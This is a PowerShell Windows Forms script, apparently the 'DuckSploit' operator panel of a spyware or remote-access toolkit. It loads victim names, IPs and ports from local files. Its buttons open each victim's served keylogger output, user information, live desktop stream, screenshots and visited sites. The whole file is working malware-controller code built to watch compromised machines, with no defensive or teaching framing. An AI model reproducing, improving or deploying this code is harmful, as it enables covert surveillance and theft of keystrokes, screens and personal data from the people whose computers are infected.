Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

$Form                            = New-Object system.Windows.Forms.Form
$Form.ClientSize                 = New-Object System.Drawing.Point(700,400)
$Form.text                       = "DUCKSPLOIT - VIEW"
$Form.TopMost                    = $true
$Form.BackColor                  = [System.Drawing.ColorTranslator]::FromHtml("#000000")


$objIcon = New-Object system.drawing.icon ("C:\DuckSploit\images\icon.ico")
$Form.Icon = $objIcon

$PictureBox1                     = New-Object system.Windows.Forms.PictureBox
$PictureBox1.width               = 150
$PictureBox1.height              = 150
$PictureBox1.location            = New-Object System.Drawing.Point(275,10)
$PictureBox1.imageLocation       = "C:\DuckSploit\images\icon-nobg.png"
$PictureBox1.SizeMode            = [System.Windows.Forms.PictureBoxSizeMode]::zoom
$PictureBox1.BackColor           = [System.Drawing.ColorTranslator]::FromHtml("#191919")

$PictureBox2                     = New-Object system.Windows.Forms.PictureBox
$PictureBox2.width               = 50
$PictureBox2.height              = 50
$PictureBox2.location            = New-Object System.Drawing.Point(640,10)
$PictureBox2.imageLocation       = "C:\DuckSploit\images\settings.png"
$PictureBox2.SizeMode            = [System.Windows.Forms.PictureBoxSizeMode]::zoom
$PictureBox2.BackColor           = [System.Drawing.ColorTranslator]::FromHtml("#191919")

$exit                           = New-Object system.Windows.Forms.Label
$exit.text                      = "X"
$exit.AutoSize                  = $true
$exit.width                     = 25
$exit.height                    = 10
$exit.location                  = New-Object System.Drawing.Point(10,10)
$exit.Font                      = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$exit.ForeColor                 = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$name                           = New-Object system.Windows.Forms.Label
$name.text                      = "NAME"
$name.AutoSize                  = $true
$name.width                     = 25
$name.height                    = 10
$name.location                  = New-Object System.Drawing.Point(30,13)
$name.Font                      = New-Object System.Drawing.Font('Microsoft Sans Serif',10)
$name.ForeColor                 = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$ip                             = New-Object system.Windows.Forms.Label
$ip.text                        = "IP"
$ip.AutoSize                    = $true
$ip.width                       = 25
$ip.height                      = 10
$ip.location                    = New-Object System.Drawing.Point(300,13)
$ip.Font                        = New-Object System.Drawing.Font('Microsoft Sans Serif',10)
$ip.ForeColor                   = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$port                          = New-Object system.Windows.Forms.Label
$port.text                     = "label"
$port.AutoSize                 = $true
$port.width                    = 25
$port.height                   = 10
$port.location                 = New-Object System.Drawing.Point(580,13)
$port.Font                     = New-Object System.Drawing.Font('Microsoft Sans Serif',10)
$port.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$Panel1                          = New-Object system.Windows.Forms.Panel
$Panel1.height                   = 40
$Panel1.width                    = 704
$Panel1.location                 = New-Object System.Drawing.Point(-1,169)
$Panel1.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("#1d1c1c")

$Panel2                          = New-Object system.Windows.Forms.Panel
$Panel2.height                   = 150
$Panel2.width                    = 708
$Panel2.location                 = New-Object System.Drawing.Point(0,235)
$Panel2.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("#202020")

$infos                           = New-Object system.Windows.Forms.Label
$infos.text                      = "See infos"
$infos.AutoSize                  = $true
$infos.width                     = 40
$infos.height                    = 15
$infos.location                  = New-Object System.Drawing.Point(55,21)
$infos.Font                      = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$infos.ForeColor                 = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$infos.BackColor                 = [System.Drawing.ColorTranslator]::FromHtml("#000000")

$keyloggs                        = New-Object system.Windows.Forms.Label
$keyloggs.text                   = "Keyloggs"
$keyloggs.AutoSize               = $true
$keyloggs.width                  = 40
$keyloggs.height                 = 15
$keyloggs.location               = New-Object System.Drawing.Point(266,22)
$keyloggs.Font                   = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$keyloggs.ForeColor              = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$keyloggs.BackColor              = [System.Drawing.ColorTranslator]::FromHtml("#000000")

$desktop                         = New-Object system.Windows.Forms.Label
$desktop.text                    = "Watch Desktop"
$desktop.AutoSize                = $true
$desktop.width                   = 40
$desktop.height                  = 15
$desktop.location                = New-Object System.Drawing.Point(463,22)
$desktop.Font                    = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$desktop.ForeColor               = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$desktop.BackColor               = [System.Drawing.ColorTranslator]::FromHtml("#000000")

$website                         = New-Object system.Windows.Forms.Label
$website.text                    = "Website"
$website.AutoSize                = $true
$website.width                   = 40
$website.height                  = 15
$website.location                = New-Object System.Drawing.Point(55,90)
$website.Font                    = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$website.ForeColor               = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$website.BackColor               = [System.Drawing.ColorTranslator]::FromHtml("#000000")

$audio                           = New-Object system.Windows.Forms.Label
$audio.text                      = "Medias"
$audio.AutoSize                  = $true
$audio.width                     = 40
$audio.height                    = 15
$audio.location                  = New-Object System.Drawing.Point(280,90)
$audio.Font                      = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$audio.ForeColor                 = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$audio.BackColor                 = [System.Drawing.ColorTranslator]::FromHtml("#000000")

$screenshot                      = New-Object system.Windows.Forms.Label
$screenshot.text                 = "Screenshots"
$screenshot.AutoSize             = $true
$screenshot.width                = 40
$screenshot.height               = 15
$screenshot.location             = New-Object System.Drawing.Point(485,90)
$screenshot.Font                 = New-Object System.Drawing.Font('Microsoft Sans Serif',20)
$screenshot.ForeColor            = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$screenshot.BackColor            = [System.Drawing.ColorTranslator]::FromHtml("#000000")

$Form.controls.AddRange(@($PictureBox1,$PictureBox2,$Panel1,$exit))
$Panel1.controls.AddRange(@($ip,$name,$port))
$Form.controls.AddRange(@($Panel2))
$Panel2.controls.AddRange(@($infos,$keyloggs,$desktop,$website,$audio,$screenshot))

$num = Get-Content C:\DuckSploit\num

# listview

$name1 = Get-Content C:\DuckSploit\victimsNAME | Select -First $num | Select -Last 1
$ip1 = Get-Content C:\DuckSploit\victimsIP | Select -First $num | Select -Last 1
$port1 = Get-Content C:\DuckSploit\victimsPORT | Select -First $num | Select -Last 1

$name.text = "Name: " + $name1
$ip.text = "Ip: " + $ip1
$port.text = "Port: " + $port1

$infos.Add_Click({ infos })

$keyloggs.Add_Click({ keyloggs })

$desktop.Add_Click({ desktop })

$audio.Add_Click({ media })

$screenshot.Add_Click({ screenshot })

$website.Add_Click({ website })

$exit.Add_Click({ exit })

$PictureBox2.Add_Click({ settings })


function infos {
	Start ("http://" + $ip1 + ":" + $port1 + "/user_infos.txt")
}

function keyloggs {
	Start ("http://" + $ip1 + ":" + $port1 + "/keylogger/")
}

function desktop {
	Start ("http://" + $ip1 + ":" + $port1 + "/desktop_stream.html")
}

function media {
	[System.Windows.Forms.MessageBox]::Show("Soon ;)", "DUCKSPLOIT" , 0, 48)
}

function screenshot {
	Start ("http://" + $ip1 + ":" + $port1 + "/screenshots/")
}

function website {
	Start ("http://" + $ip1 + ":" + $port1 + "/sites/")
}

function settings {
	./edit.ps1
}

function exit {
	$Form.Close();
}

#region Logic 

#endregion

[void]$Form.ShowDialog()